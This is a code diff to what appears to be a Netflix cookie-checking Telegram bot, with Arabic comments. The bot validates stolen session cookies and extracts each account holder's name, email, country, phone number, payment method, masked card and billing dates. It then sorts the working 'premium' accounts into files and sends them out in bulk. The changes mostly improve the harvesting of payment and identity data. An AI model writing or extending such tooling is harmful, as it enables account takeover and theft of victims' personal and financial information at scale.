@@ -237,6 +237,9 @@ def clean_text(text):
     text = text.replace('\\x2F', '/')
     text = text.replace('\\"', '"')
     text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
+    # إزالة التكرار في الدولة
+    if len(text) == 5 and text[2] == ' ' and text[0:2] == text[3:5]:
+        text = text[0:2]
     return text.strip()
 
 def decode_netflix_value(value):
@@ -275,12 +278,17 @@ def normalize_phone_number(phone, country_code=None):
     if not cleaned:
         return phone
     
-    # إضافة كود الدولة للأرقام الإندونيسية
-    if country_code == "ID" or country_code == "IN":
+    # إضافة كود الدولة
+    if country_code in ["ID", "IN"]:
         if cleaned.startswith('0'):
             cleaned = '62' + cleaned[1:]
         if not cleaned.startswith('62') and len(cleaned) >= 10:
             cleaned = '62' + cleaned
+    elif country_code == "RO":
+        if cleaned.startswith('0'):
+            cleaned = '40' + cleaned[1:]
+        if not cleaned.startswith('40') and len(cleaned) >= 9:
+            cleaned = '40' + cleaned
     
     if len(cleaned) >= 10:
         return f"+{cleaned}"
@@ -506,7 +514,7 @@ def extract_account_info(growth_account):
     """استخراج بيانات الحساب من growthAccount"""
     info = {}
     
-    # معلومات الحساب الأساسية (استخدم ownerName بدلاً من accountOwnerName)
+    # معلومات الحساب الأساسية
     info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName'))
     if not info['accountOwnerName']:
         info['accountOwnerName'] = decode_netflix_value(growth_account.get('accountOwnerName'))
@@ -551,7 +559,7 @@ def extract_account_info(growth_account):
             info['email'] = email_value
         info['emailVerified'] = email_obj.get('isVerified', False)
     
-    # البروفايلات - استخراج الأسماء الحقيقية
+    # البروفايلات
     profiles = growth_account.get('profiles', [])
     profile_names = []
     for p in profiles:
@@ -568,6 +576,52 @@ def extract_account_info(growth_account):
     info['showExtraMemberSection'] = "Yes" if growth_account.get('showExtraMemberSection') else "No"
     
     return {k: v for k, v in info.items() if v}
+
+def get_name_from_profiles(info):
+    """استخراج الاسم من أول بروفايل"""
+    profiles_raw = info.get("profiles") or ""
+    if profiles_raw:
+        profiles_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
+        # فلترة أسماء المتصفحات
+        for name in profiles_list:
+            if name.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux', 'unknown']:
+                return name
+        if profiles_list:
+            return profiles_list[0]
+    return "Unknown"
+
+def extract_payment_method_full(html_content, info):
+    """استخراج وسيلة الدفع من كل المصادر"""
+    
+    # المحاولة 1: من GraphQL
+    payment = info.get("paymentMethodType")
+    if payment and payment != "Unknown" and payment != "N/A":
+        if payment.upper() == "CC":
+            return "Credit Card"
+        return payment
+    
+    # المحاولة 2: من HTML
+    patterns = [
+        r'"paymentMethodType"\s*:\s*"([^"]+)"',
+        r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
+        r'"paymentMethod"\s*:\s*"([^"]+)"',
+        r'"paymentType"\s*:\s*"([^"]+)"',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, html_content)
+        if match:
+            payment = decode_netflix_value(match.group(1))
+            if payment and payment != "null":
+                if payment.upper() == "CC":
+                    return "Credit Card"
+                return payment
+    
+    # المحاولة 3: من maskedCard (لو في كارت يبقى أكيد في طريقة دفع)
+    card = info.get("maskedCard")
+    if card and card != "N/A":
+        return "Credit Card"
+    
+    return "Unknown"
 
 def extract_profile_names(response_text):
     names = []
@@ -617,21 +671,30 @@ def extract_info_fallback(response_text):
     return {k: v for k, v in extracted.items() if v}
 
 def extract_info(response_text):
-    # أولاً: حاول تجيب البيانات من GraphQL
+    # تجميع البيانات من كل المصادر
+    all_info = {}
+    
+    # 1. GraphQL data
     graphql_info = extract_graphql_data(response_text)
     if graphql_info and has_any_account_info(graphql_info):
-        # تنظيف الإيميل من الرموز المشفرة
-        if graphql_info.get('email'):
-            graphql_info['email'] = clean_text(graphql_info['email'])
-        if graphql_info.get('accountOwnerName'):
-            name = clean_text(graphql_info['accountOwnerName'])
-            # تأكد أن الاسم مش اسم متصفح
-            if name.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
-                graphql_info['accountOwnerName'] = name
-        return graphql_info
+        all_info.update(graphql_info)
     
-    # لو مش موجود، استخدم الطريقة القديمة
-    return extract_info_fallback(response_text)
+    # 2. Fallback HTML data
+    fallback_info = extract_info_fallback(response_text)
+    if fallback_info:
+        all_info.update(fallback_info)
+    
+    # تنظيف وتنسيق البيانات
+    if all_info.get('email'):
+        all_info['email'] = clean_text(all_info['email'])
+    
+    if all_info.get('countryOfSignup'):
+        all_info['countryOfSignup'] = clean_text(all_info['countryOfSignup'])
+    
+    if all_info.get('memberSince'):
+        all_info['memberSince'] = clean_text(all_info['memberSince'])
+    
+    return all_info if has_any_account_info(all_info) else {}
 
 def normalize_plan_key(plan_name):
     if not plan_name:
@@ -721,6 +784,7 @@ def country_code_to_flag(country_code):
 
 def format_country_with_flag(country_value):
     country = decode_netflix_value(country_value) or "Unknown"
+    country = clean_text(country)
     flag = country_code_to_flag(country)
     return f"{country} {flag}".strip()
 
@@ -803,10 +867,10 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     plan_key, plan_label = derive_plan_info(info, is_subscribed)
     status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
     
-    name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
-    # تأكد أن الاسم مش اسم متصفح
-    if name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
-        name = "Unknown"
+    # جلب الاسم من البروفايلات إذا كان Unknown
+    account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
+    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+        account_name = get_name_from_profiles(info)
     
     email = decode_netflix_value(info.get("email")) or "Unknown"
     email = clean_text(email)
@@ -818,7 +882,15 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     price = decode_netflix_value(info.get("planPrice")) or "N/A"
     member_since = format_member_since(info.get("memberSince")) or "Unknown"
     next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
-    payment = decode_netflix_value(info.get("paymentMethodType")) or "Unknown"
+    
+    # وسيلة الدفع - استخراج محسن
+    payment = extract_payment_method_full(cookie_filename if hasattr(cookie_filename, 'find') else "", info)
+    if payment == "Unknown":
+        # محاولة أخيرة
+        payment = decode_netflix_value(info.get("paymentMethodType")) or "Unknown"
+        if payment and payment.upper() == "CC":
+            payment = "Credit Card"
+    
     card = decode_netflix_value(info.get("maskedCard")) or "N/A"
     phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
     phone_verified = "Verified" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "Not Verified"
@@ -829,9 +901,8 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
     membership_status = decode_netflix_value(info.get("membershipStatus")) or "Unknown"
     
-    # Get profiles - استخراج أسماء البروفايلات الحقيقية
+    # Get profiles
     profiles_raw = info.get("profiles") or ""
-    # تنظيف الأسماء من أسماء المتصفحات
     profiles_list = []
     for p in profiles_raw.split(","):
         p_clean = p.strip()
@@ -851,7 +922,7 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     lines.append("")
     lines.append("ACCOUNT DETAILS")
     lines.append("-" * 40)
-    lines.append(f"Name: {name}")
+    lines.append(f"Name: {account_name}")
     lines.append(f"Email: {email}")
     lines.append(f"Country: {country}")
     lines.append(f"Plan: {plan}")
@@ -863,9 +934,9 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
             lines.append(f"Member Since: {member_since}")
         if next_billing != "Unknown":
             lines.append(f"Next Billing: {next_billing}")
-        if payment:
+        if payment and payment != "Unknown":
             lines.append(f"Payment: {payment}")
-        if payment.upper() == "CC" and card != "N/A" and card:
+        if payment and payment.upper() == "CC" and card != "N/A" and card:
             lines.append(f"Card: {card}")
         if phone != "N/A" and phone:
             lines.append(f"Phone: {phone} ({phone_verified})")
@@ -1211,7 +1282,6 @@ Speed: {spd:.2f} accounts/second
                 buf.seek(0)
                 filename = f"{plan.upper()}_ACCOUNTS.txt"
                 await update.message.reply_document(document=buf, filename=filename, caption=f"📄 {len(results)} {plan.upper()} Accounts Found")
-                files_sent.append(filename)
         
         # Send partial data file
         if results_by_plan["partial"]:
